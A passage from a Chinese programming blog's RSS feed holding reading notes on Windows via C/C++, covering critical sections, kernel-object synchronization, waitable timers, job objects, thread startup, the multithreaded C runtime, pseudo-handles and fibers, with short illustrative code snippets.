&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;CRITICAL_SECTION&lt;/span&gt; &lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;InitializeCriticalSection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;EnterCriticalSection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;EnterCriticalSection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="n"&gt;testing&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;LeaveCriticalSection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;LeaveCriticalSection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 考虑到线程进入等待状态时，要保护现场，这是非常耗时的。这可以用 InitializeCriticalSectionAndSpinCount，它让想进入已被占用的关键代码段的线程先循环判断多次，才进入等待状态。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;InitializeCriticalSectionAndSpinCount 只对多个 CPU 起作用，单个 CPU 不起作用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SetCriticalSectionSpinCount 可以改变循环判断的次数 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 关键代码段是在用户态实现同步的方法，这样比内核态同步要快，因为不用做用户态和内核态之间的往返（往返一次需要占用 x 8 6 平台上的大约 1 0 0 0 个 C P U 周期）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_3"&gt; 内核对象同步 &lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 当内核对象是自动设置为有信号时，在所有等待该内核对象的线程中，只会有一个变为可调度，然后该内核对象又自动设为无信号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 当内核对象是手动设置为有信号时，除非手动设置该内核对象的状态，否则一直是有信号，这样所有等待该内核对象的线程都能变为可调度。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="waitabletimer"&gt;WaitableTimer&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;WaitableTimer 能在规定时候或按规定的时间间隔变为有信号状态，就类似闹钟。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SetWaitableTimer 设置开始定时的时间（如果传参是负数，则是相对于这个函数被调用的时间）、定时的间隔、定时间隔到时调用的函数 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CancelWaitableTimer 取消 WaitableTimer 的定时。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_4"&gt; 其他等待函数 &lt;/h2&gt;
&lt;p&gt;--- | ---
MsgWaitForMultipleObjects 和 MsgWaitForMultipleObjectsEx | 等待多个内核对象有信号、或指定类型消息到达线程的输入队列
SingleObjectAndWait | 在一个原子操作完成设置一个内核对象为有信号，并进入等待另一个内核对象 &lt;/p&gt;
&lt;h2 id="_5"&gt; 各同步的内核对象的理解 &lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 关键代码段 :&lt;/p&gt;
&lt;p&gt;critical section , 关键代码段之间的代码是原子操作，同一时间只能有一个线程执行该段代码，与别的同步 object 都是内核态的同步相比，它争取用用户态的方式进行同步，如果用户态的用户不行，才用内核态的同步，这样效率更高 , 花费较少 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 锁 :&lt;/p&gt;
&lt;p&gt;mutex，只允许一个线程拥有
semaphore，允许指定数量的线程拥有，创建此 object 时可以指定能拥有的最多的线程数 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 信号：&lt;/p&gt;
&lt;p&gt;event，不同于锁，就如它的名字是 “ 信号 ”，当一个线程拥有锁的时候就会改变锁的状态以达到同步（` 成功拥有 mutex 则使它无信号；成功拥有 semaphore 则使它计数减一，当计数为零，则 semaphore 变成无信号状态），手动设置的 event 的状态只有线程调用 SetEvent 或 ResetEvent 才会改变，线程则通过 WaitForSingleObject 等检测信号状态的函数来达到同步。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 05 Sep 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-09-05:blog/2011/09/05/windowshe-xin-bian-cheng-du-shu-bi-ji-3-xian-cheng-tong-bu/</guid><category>windows</category><category>programming</category></item><item><title>《Windows核心编程》读书笔记2--进程、作业、线程</title><link>http://www.goorockey.com/blog/2011/09/03/windowshe-xin-bian-cheng-du-shu-bi-ji-2-jin-cheng-zuo-ye-xian-cheng/</link><description>
&lt;h2 id="_1"&gt; 一、摘要：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 进程只是线程的容器，存放数据和代码，但不执行代码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 线程才是执行代码的实体。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 作业是对一个或多个进程的统一管理，能添加一般无法添加的限制。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_2"&gt; 二、进程 &lt;/h2&gt;
&lt;p&gt;1. 概念 &lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 进程只是线程的容器 &lt;/strong&gt;，为线程执行代码提供资源、营造运行环境。&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt;2. 进程的构成 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 关键：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt; 一块内存地址空间，用以存放代码和数据；
一个内核对象句柄表，记录使用中的内核对象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt; 更详尽的构成 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;( 来自 MSDN &lt;a href="http://msdn.microsoft.com/zh-cn/library/ms681917(v=vs.85).aspx"&gt;http://msdn.microsoft.com/zh-cn/library/ms681917(v=vs.85).aspx&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;virtual&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;space&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;executable&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;open&lt;/span&gt; &lt;span class="n"&gt;handles&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;security&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;unique&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="n"&gt;identifier&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;environment&lt;/span&gt; &lt;span class="n"&gt;variables&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;priority&lt;/span&gt; &lt;span class="n"&gt;class&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;minimum&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;maximum&lt;/span&gt; &lt;span class="n"&gt;working&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;sizes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;least&lt;/span&gt; &lt;span class="n"&gt;one&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;execution&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3. 进程的终止 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 全部线程都结束。即使主线程退出了，如果还有线程存在，该进程仍然不会销毁。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ExitProcess，有可能造成内存泄露，因为 C/C++ Runtime Library 没有被清空，则全局变量等资源就不会被释放。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TerminateProcess，跟 ExitProcess 一样是可能造成内存泄露的。另外它是异步的，即只是通知要终止目标进程，返回后并不代表它已结束。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_3"&gt; 三、作业 &lt;/h2&gt;
&lt;p&gt;1. 基本概念 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt; 作业是进程的容器 &lt;/strong&gt;，对一个或多个进程附加一定的限制，进行统一管理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 即使作业只包含了一个进程也是有用的，因为这样能做一些普通不能进行的限制 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2. 主要的 API:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;API&lt;/th&gt;
&lt;th&gt; 功能 &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CreateJobObject&lt;/td&gt;
&lt;td&gt; 创建作业内核对象 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OpenJobObject&lt;/td&gt;
&lt;td&gt; 根据 Handle 打开作业内核对象 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IsProcessInJob&lt;/td&gt;
&lt;td&gt; 验证某一个进程是否存在于作业中 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SetInformationJobObject&lt;/td&gt;
&lt;td&gt; 给作业加上各种限制 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;QueryInformationJobObject&lt;/td&gt;
&lt;td&gt; 查询作业对象的信息 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AssignProcessToJobObject&lt;/td&gt;
&lt;td&gt; 将进程放入作业 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TerminateJobObject&lt;/td&gt;
&lt;td&gt; 终止作业内所有进程 &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;3. 用于作业对象的基本用户界面限制的位标志 &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; 标志 &lt;/th&gt;
&lt;th&gt; 描述 &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_EXITWINDOWS&lt;/td&gt;
&lt;td&gt; 用于防止进程通过 ExitWindowsEx 函数退出、关闭、重新引导或关闭系统电源 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_READCLIPBOARD&lt;/td&gt;
&lt;td&gt; 防止进程读取剪贴板的内容 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_WRITECLIPBOARD&lt;/td&gt;
&lt;td&gt; 防止进程删除剪贴板的内容 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS&lt;/td&gt;
&lt;td&gt; 防止进程通过 SystemParametersInfor 函数来改变系统参数 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_DISPLAYSETTINGS&lt;/td&gt;
&lt;td&gt; 防止进程通过 ChangeDisplaySettings 函数来改变显示设置 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_GLOBALATOMS&lt;/td&gt;
&lt;td&gt; 为作业赋予它自己的基本结构表，使作业中的进程只能访问该作业的表 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_DESKTOP&lt;/td&gt;
&lt;td&gt; 防止进程使用 CreateDesktop 或 SwitchDesktop 函数创建或转换桌面 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JOB_OBJECT_UILIMIT_HANDLES&lt;/td&gt;
&lt;td&gt; 防止作业中的进程使用同一作业外部的进程创建的 USER 对象（如 HWND）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id="_4"&gt; 四、线程 &lt;/h2&gt;
&lt;p&gt;1. 基本概念 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 进程不执行代码的，&lt;strong&gt; 是线程在进程地址空间内执行代码 &lt;/strong&gt;，并对进程地址空间内的数据做操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 多个线程共享进程内的地址空间，包括进程的内核对象句柄表，因为句柄表的存在依赖于进程，而不是线程。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2. 线程的构成 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 关键：&lt;/p&gt;
&lt;p&gt; 一个堆栈、
一些用于保护线程的寄存器、
一个指令寄存器（IP）、
堆栈指针寄存器（SP）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 更详尽的构成 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（来自 MSDN &lt;a href="http://msdn.microsoft.com/zh-cn/library/ms681917(v=vs.85).aspx"&gt;http://msdn.microsoft.com/zh-cn/library/ms681917(v=vs.85).aspx&lt;/a&gt;）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;threads&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="n"&gt;share&lt;/span&gt; &lt;span class="n"&gt;its&lt;/span&gt; &lt;span class="n"&gt;virtual&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;space&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;resources&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="n"&gt;addition&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;each&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;maintains&lt;/span&gt; &lt;span class="n"&gt;exception&lt;/span&gt; &lt;span class="n"&gt;handlers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;scheduling&lt;/span&gt; &lt;span class="n"&gt;priority&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;unique&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;identifier&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;structures&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;save&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="n"&gt;until&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;scheduled&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="n"&gt;includes&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;machine&lt;/span&gt; &lt;span class="n"&gt;registers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;kernel&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;environment&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;space&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="n"&gt;Threads&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;also&lt;/span&gt; &lt;span class="n"&gt;have&lt;/span&gt; &lt;span class="n"&gt;their&lt;/span&gt; &lt;span class="n"&gt;own&lt;/span&gt; &lt;span class="n"&gt;security&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;used&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;impersonating&lt;/span&gt; &lt;span class="n"&gt;clients&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3. 线程的启动 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 初始化线程时会把 线程函数的入参 (pvParam)、线程函数的指针 (pfnStartAddrj) 压栈。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=" 线程堆栈 " src="http://www.goorockey.com/uploads/2011/09/clip_image0011.png"/&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 每个线程还有一个指令寄存器（IP）和堆栈指针寄存器（SP）。IP 初始指向 BaseThreadStart 函数，它包含在 Kernel32.dll 中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 它主要是调用线程函数，并把函数返回值传给 ExitThread：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;VOID&lt;/span&gt; &lt;span class="nf"&gt;BaseThreadStart&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTHREAD_START_ROUTINE&lt;/span&gt; &lt;span class="n"&gt;pfnStartAddr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;PVOID&lt;/span&gt; &lt;span class="n"&gt;pvParam&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kr"&gt;__try&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;ExitThread&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;pfnStartAddr&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;pvParam&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="kr"&gt;__except&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UnhandledExceptionFilter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GetExceptionInformation&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;ExitProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GetExceptionCode&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="c1"&gt;//NOTE: We never get here. &lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt; 之所以 pfnStartAddr 和 pvParam 压栈，就是因为线程开始运行时，CPU 跳到 IP 指向 BaseThreadStart，然后把 pfnStartAddr 和 pvParam 出栈，就把它们当做形参传给 BaseThreadStart 了。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_5"&gt; 五、其他 &lt;/h2&gt;
&lt;p&gt;1.C/C++ Runtime Library 的多线程版本 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 在 C/C++ Runtime Library 中，有一些全局变量。它们有可能同时被多个线程访问，使它们的值无法确定。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;C/C++ Runtime Library 为了适应多线程，出现多线程 (MT) 版本，改变一些全局变量和函数的特性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 主要思路是为每个线程关联一个数据结构 &lt;strong&gt;tiddata 块 &lt;/strong&gt;，里面都有各全局变量对于这个线程的副本。即每个线程访问的是属于自己的 “ 全局变量 ”，有属于自己的独立环境。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 而相关的函数对这些全局变量的操作也会改为对于 &lt;strong&gt;tiddata 块 &lt;/strong&gt; 对于值的操作。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 例如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;_beginthreadex&lt;/span&gt;&lt;span class="err"&gt; 就是在调用 &lt;/span&gt;&lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="err"&gt; 来创建线程的基础上，在线程初始化时创建线程关联的 &lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;tiddata&lt;/span&gt;&lt;span class="err"&gt; 块 &lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="err"&gt;，并把这些全局变量拷贝到里面。所以 &lt;/span&gt;&lt;span class="n"&gt;_beginthreadex&lt;/span&gt;&lt;span class="err"&gt; 比 &lt;/span&gt;&lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="err"&gt; 要安全。&lt;/span&gt;
&lt;span class="n"&gt;_endthreadex&lt;/span&gt;&lt;span class="err"&gt; 则是对应多做了清空关联数据结构的操作。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 如果在多线程版本的 C/C++ Runtime Library 中，用了 CreateThread 来创建线程，则线程初始化时不会有 &lt;strong&gt;tiddata 块 &lt;/strong&gt;。而当函数要访问 &lt;strong&gt;tiddata 块 &lt;/strong&gt; 的时候，开始会访问失败，然后会自动生成一个，并把它与线程关联起来。但在一些情况下调用 CreateThread 就可能出现错误。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;_beginthread 比 _beginthreadex、以及 _endthread 比 _endthreadex 的参数要少，少了对线程安全访问权的控制。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2. 伪句柄 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 用 GetCurrentThread 和 GetCurrentProcess 得到句柄是自己句柄的引用，并不会使线程进程的使用计数加 1，它们返回的句柄叫伪句柄。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 用 CloseHandle 关闭伪句柄时，会返回 FALSE。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3. 纤程 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;UNIX 服务器应用程序属于单线程程序（Windows 定义），但其内部仿真了多线程工作。为了方便把 UNIX 服务器应用程序移植到 Windows，就推出了纤程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ConvertThreadToFiber 把线程转换为纤程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 纤程不应该返回，返回会使线程和该线程所有的纤程都撤销。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 在单个线程里，每次只能运行一个纤程。可以用 SwtichToFiber 来切换纤程 &lt;/p&gt;
&lt;/li&gt;
